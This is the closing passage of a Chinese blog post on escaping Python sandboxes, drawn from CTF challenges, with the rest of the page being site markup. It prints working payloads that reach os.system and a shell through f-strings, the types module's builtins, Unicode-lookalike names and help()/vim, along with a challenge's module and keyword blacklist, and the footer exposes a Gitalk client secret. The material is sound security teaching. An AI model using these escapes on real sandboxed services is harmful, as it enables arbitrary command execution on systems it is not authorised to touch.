+PY</code></pre>
+
+<p> 上面这几个表达式都可以替换掉 <code>and</code></p>
+<h3 id="限制"><a href="#限制" class="headerlink" title="限制 ( )"></a><strong>限制 ( )</strong></h3><p>这种情况下通常需要能够支持 exec 执行代码。因为有两种姿势：</p>
+<ul>
+<li>利用装饰器 <code>@</code></li>
+<li>利用魔术方法，例如 <code>enum.EnumMeta.__getitem__</code>，</li>
+</ul>
+<p>利用这两种姿势，我在《OrangeKiller CTF 第 2 期》中出了 2 道题目，题解篇写的很详细，移步去看吧：<a target="_blank" rel="noopener" href="https://www.tr0y.wang/2022/06/27/OrangeKiller_CTF_2_wp/">传送门</a></p>
+<h3 id="利用新特性"><a href="#利用新特性" class="headerlink" title="利用新特性"></a><strong>利用新特性</strong></h3><p>PEP 498 引入了 <code>f-string</code>，在 3.6 开始出现：<a target="_blank" rel="noopener" href="https://docs.python.org/3.6/whatsnew/3.6.html#new-features">传送门🚪</a>，食用方式：<a target="_blank" rel="noopener" href="https://docs.python.org/3.6/reference/lexical_analysis.html#f-strings">传送门🚪</a>。所以我们就有了一种船新的利用方式：</p>
+<pre class="language-none"><code class="language-none">&gt;&gt;&gt; f'{__import__("os").system("whoami")}'
+macr0phag3
+'0'
+PYTHON</code></pre>
+
+<p> 关注每次版本增加的新特性，或许能淘到点宝贝。</p>
+<h3 id="利用反序列化攻击"><a href="#利用反序列化攻击" class="headerlink" title="利用反序列化攻击"></a><strong>利用反</strong>序列化<strong>攻击</strong></h3><p>反序列化攻击也是能用来逃逸，但是关于反序列化攻击的安全问题还挺多的，见这篇文章，见：<a target="_blank" rel="noopener" href="https://www.tr0y.wang/2022/02/03/SecMap-unserialize-python/">传送门🚪</a></p>
+<h2 id="🌰"><a href="#🌰" class="headerlink" title="🌰"></a><strong>🌰</strong></h2><p>这个例子来自<code>iscc 2016</code>的<code>Pwn300 pycalc</code>，相当有趣：</p>
+<pre class="language-none"><code class="language-none">#!/usr/bin/env python2
+# -*- coding:utf-8 -*-
+
+
+def banner():
+ print "============================================="
+ print " Simple calculator implemented by python "
+ print "============================================="
+ return
+
+
+def getexp():
+ return raw_input("&gt;&gt;&gt; ")
+
+
+def _hook_import_(name, *args, **kwargs):
+ module_blacklist = ['os', 'sys', 'time', 'bdb', 'bsddb', 'cgi',
+ 'CGIHTTPServer', 'cgitb', 'compileall', 'ctypes', 'dircache',
+ 'doctest', 'dumbdbm', 'filecmp', 'fileinput', 'ftplib', 'gzip',
+ 'getopt', 'getpass', 'gettext', 'httplib', 'importlib', 'imputil',
+ 'linecache', 'macpath', 'mailbox', 'mailcap', 'mhlib', 'mimetools',
+ 'mimetypes', 'modulefinder', 'multiprocessing', 'netrc', 'new',
+ 'optparse', 'pdb', 'pipes', 'pkgutil', 'platform', 'popen2', 'poplib',
+ 'posix', 'posixfile', 'profile', 'pstats', 'pty', 'py_compile',
+ 'pyclbr', 'pydoc', 'rexec', 'runpy', 'shlex', 'shutil', 'SimpleHTTPServer',
+ 'SimpleXMLRPCServer', 'site', 'smtpd', 'socket', 'SocketServer',
+ 'subprocess', 'sysconfig', 'tabnanny', 'tarfile', 'telnetlib',
+ 'tempfile', 'Tix', 'trace', 'turtle', 'urllib', 'urllib2',
+ 'user', 'uu', 'webbrowser', 'whichdb', 'zipfile', 'zipimport']
+ for forbid in module_blacklist:
+ if name == forbid: # don't let user import these modules
+ raise RuntimeError('No you can\' import {0}!!!'.format(forbid))
+ # normal modules can be imported
+ return __import__(name, *args, **kwargs)
+
+
+def sandbox_filter(command):
+ blacklist = ['exec', 'sh', '__getitem__', '__setitem__',
+ '=', 'open', 'read', 'sys', ';', 'os']
+ for forbid in blacklist:
+ if forbid in command:
+ return 0
+ return 1
+
+
+def sandbox_exec(command): # sandbox user input
+ result = 0
+ __sandboxed_builtins__ = dict(__builtins__.__dict__)
+ __sandboxed_builtins__['__import__'] = _hook_import_ # hook import
+ del __sandboxed_builtins__['open']
+ _global = {
+ '__builtins__': __sandboxed_builtins__
+ }
+ if sandbox_filter(command) == 0:
+ print 'Malicious user input detected!!!'
+ exit(0)
+ command = 'result = ' + command
+ try:
+ exec command in _global # do calculate in a sandboxed environment
+ except Exception, e:
+ print e
+ return 0
+ result = _global['result'] # extract the result
+ return result
+
+
+banner()
+while 1:
+ command = getexp()
+ print sandbox_exec(command)
+PYTHON</code></pre>
+
+<p><code>exec command in _global</code> 这一句就把很多 payload 干掉了，由于 exec 运行在自定义的全局命名空间里，这时候会处于<code>restricted execution mode</code>，这里不赘述了，感兴趣可以看这篇文章：<a target="_blank" rel="noopener" href="http://tav.espians.com/paving-the-way-to-securing-the-python-interpreter.html">传送门🚪</a>。exec 加上定制的 globals 会使得沙箱安全很多，一些常规的 payload 是没法使用的，例如：</p>
+<pre class="language-none"><code class="language-none">&gt;&gt;&gt; ''.__class__.__mro__[-1].__subclasses__()[71]._Printer__setup.__globals__
+restricted attribute
+&gt;&gt;&gt; getattr(getattr(__import__('types'), 'FileType')('key'), 're''ad')()
+file() constructor not accessible in restricted mode
+DELPHI</code></pre>
+
+<p> 不过也正是由于 exec 运行在特定的命名空间里，可以通过其他命名空间里的 <code>__builtins__</code>，比如 types 库，来执行任意命令：</p>
+<pre class="language-none"><code class="language-none">&gt;&gt;&gt; getattr(__import__('types').__builtins__['__tropmi__'[::-1]]('so'[::-1]), 'mets' 'ys'[::-1])('whoami')
+macr0phag3
+LISP</code></pre>
+
+<h3 id="极端限制"><a href="#极端限制" class="headerlink" title="极端限制"></a><strong>极端限制</strong></h3><p>这种限制一般是组合形式出现，而且通常只会出现在 CTF 中。</p>
+<blockquote>
+<p>限制输入字符的集合的大小</p>
+</blockquote>
+<p>思路就是先确定不得不用到的字符，再看这些字符能够拼出哪些函数或者常量。</p>
+<p>在《OrangeKiller CTF 第 2 期》中出了 3 道题目与此相关，移步去看吧：<a target="_blank" rel="noopener" href="https://www.tr0y.wang/2022/06/27/OrangeKiller_CTF_2_wp/">传送门</a></p>
+<blockquote>
+<p>限制不能使用 <code>[a-zA-Z]</code> 的字符</p>
+</blockquote>
+<p>我在 <a target="_blank" rel="noopener" href="https://www.tr0y.wang/2020/08/18/IDN/#%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF">《从一个绕过长度限制的 XSS 中，我们能学到什么？》</a> 中提到过，Python3 支持了 Unicode 变量名且解释器在做代码解析的时候，会对变量名进行规范化，算法是 <code>NFKC</code>。</p>
+<p>所以在这种情况下可以用这种姿势：</p>
+<pre class="language-none"><code class="language-none">eval == ᵉval
+PYTHON</code></pre>
+
+<blockquote>
+<p>socket + 严格的输入限制</p>
+</blockquote>
+<p>可以看看是否漏掉了 <code>help</code>，漏掉的话，先通过 <code>help()</code> 调起 vi/vim，然后用 <code>!</code> 指令即可 getshell :)</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.tr0y.wang/2019/05/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/#%E9%80%9A%E8%BF%87%E7%BB%A7%E6%89%BF%E5%85%B3%E7%B3%BB%E9%80%83%E9%80%B8">https://www.tr0y.wang/2019/05/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/#%E9%80%9A%E8%BF%87%E7%BB%A7%E6%89%BF%E5%85%B3%E7%B3%BB%E9%80%83%E9%80%B8</a></p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/web%E5%AE%89%E5%85%A8/">
+                                    <span class="chip bg-color">web安全</span>
+                                </a>
+                            
+                                <a href="/tags/python%E5%AE%89%E5%85%A8/">
+                                    <span class="chip bg-color">python安全</span>
+                                </a>
+                            
+                                <a href="/tags/%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0/">
+                                    <span class="chip bg-color">进阶学习</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+        <link rel="stylesheet" href="/libs/gitalk/gitalk.css">
+<link rel="stylesheet" href="/css/my-gitalk.css">
+
+<div class="card gitalk-card" data-aos="fade-up">
+    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论</span>
+    </div>
+    <div id="gitalk-container" class="card-content"></div>
+</div>
+
+<script src="/libs/gitalk/gitalk.min.js"></script>
+<script>
+    let gitalk = new Gitalk({
+        clientID: '0efb4a442bc09d1ba17e',
+        clientSecret: 'd26f520fef841de4f4388029a0d5c0f4730357cf',
+        repo: 'yyjccc.github.io',
+        owner: 'Yyjccc',
+        admin: "Yyjccc",
+        id: '2023-08-28T21-21-48',
+        distractionFreeMode: false  // Facebook-like distraction free mode
+    });
+
+    gitalk.render('gitalk-container');
+</script>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/2023/08/28/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="初探python沙箱逃逸">
+                        
+                        <span class="card-title">初探python沙箱逃逸</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-08-28
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Yyjccc
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/web%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">web安全</span>
+                    </a>
+                    
+                    <a href="/tags/python%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">python安全</span>
+                    </a>
+                    
+                    <a href="/tags/%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0/">
+                        <span class="chip bg-color">进阶学习</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2023/08/28/%E5%88%9D%E6%8E%A2python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="">
+                        
+                        <span class="card-title"></span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-08-28
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Yyjccc
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+
+  <!-- 是否加载使用自带的 prismjs. -->
+  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>
+
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+                <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="/libs/aplayer/Meting.min.js"></script>
+
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2023</span>
+            
+            <a href="/about" target="_blank">Yyjccc</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            
+            <br>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/yyjccc" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:yanyongjuyyj@gmail.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=3393867490" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 3393867490" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+                    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+                        <!-- 白天和黑夜主题 -->
+<div class="stars-con">
+    <div id="stars"></div>
+    <div id="stars2"></div>
+    <div id="stars3"></div>  
+</div>
+
+<script>
+    function switchNightMode() {
+        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
+        setTimeout(function () {
+            $('body').hasClass('DarkMode') 
+            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
+            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
+            
+            setTimeout(function () {
+            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
+                $(this).remove()
+            })
+            }, 2e3)
+        })
+    }
+</script>
+
+                            <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+                                <script
+                                    src="/libs/materialize/materialize.min.js"></script>
+                                <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+                                <script src="/libs/aos/aos.js"></script>
+                                <script
+                                    src="/libs/scrollprogress/scrollProgress.min.js"></script>
+                                <script
+                                    src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+                                <script src="/js/matery.js"></script>
+
+                                
+
+                                        
+
+                                                
+
+                                                    <script type="text/javascript">
+                                                        // 只在桌面版网页启用特效
+                                                        var windowWidth = $(window).width();
+                                                        if (windowWidth > 768) {
+                                                            document.write('<script type="text/javascript" src="/libs/others/sakura.js"><\/script>');
+                                                        }
+                                                    </script>
+                                                    
+
+                                                        <!-- 雪花特效 -->
+                                                        
+                                                            <script type="text/javascript">
+                                                                // 只在桌面版网页启用特效
+                                                                var windowWidth = $(window).width();
+                                                                if (windowWidth > 768) {
+                                                                    document.write('<script type="text/javascript" src="/libs/others/snow.js"><\/script>');
+                                                                }
+                                                            </script>
+                                                            
+
+                                                                <!-- 鼠标星星特效 -->
+                                                                
+                                                                    <script type="text/javascript">
+                                                                        // 只在桌面版网页启用特效
+                                                                        var windowWidth = $(window).width();
+                                                                        if (windowWidth > 768) {
+                                                                            document.write('<script type="text/javascript" src="/libs/others/star.js"><\/script>');
+                                                                        }
+                                                                    </script>
+                                                                    
+
+                                                                        
+                                                                            <script
+                                                                                src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+                                                                            <script
+                                                                                src="/libs/others/TencentCaptcha.js"></script>
+                                                                            <button id="TencentCaptcha"
+                                                                                data-appid="xxxxxxxxxx"
+                                                                                data-cbfn="callback" type="button"
+                                                                                hidden></button>
+                                                                            
+
+                                                                                <!-- Baidu Analytics -->
+
+                                                                                    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+                                                                                        
+                                                                                            <script
+                                                                                                src="/libs/others/clicklove.js"
+                                                                                                async="async"></script>
+                                                                                            
+                                                                                                
+                                                                                                    <script async
+                                                                                                        src="/libs/others/busuanzi.pure.mini.js"></script>
+                                                                                                    
+
+                                                                                                        
+
+                                                                                                                
+
+                                                                                                                        <!--腾讯兔小巢-->
+                                                                                                                        
+                                                                                                                                
+                                                                                                                                    <script
+                                                                                                                                        type="text/javascript"
+                                                                                                                                        color="0,0,255"
+                                                                                                                                        pointColor="0,0,255"
+                                                                                                                                        opacity='0.7'
+                                                                                                                                        zIndex="-1"
+                                                                                                                                        count="99"
+                                                                                                                                        src="/libs/background/canvas-nest.js"></script>
+                                                                                                                                    
+
+                                                                                                                                        
+
+                                                                                                                                                    
+
+                                                                                                                                                            
+                                                                                                                                                                <script
+                                                                                                                                                                    src="/libs/instantpage/instantpage.js"
+                                                                                                                                                                    type="module"></script>
+                                                                                                                                                                
+
+    <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":true,"react":{"opacity":0.7}}});</script><!-- hexo-inject:begin --><!-- hexo-inject:end --></body>
+
+</html>
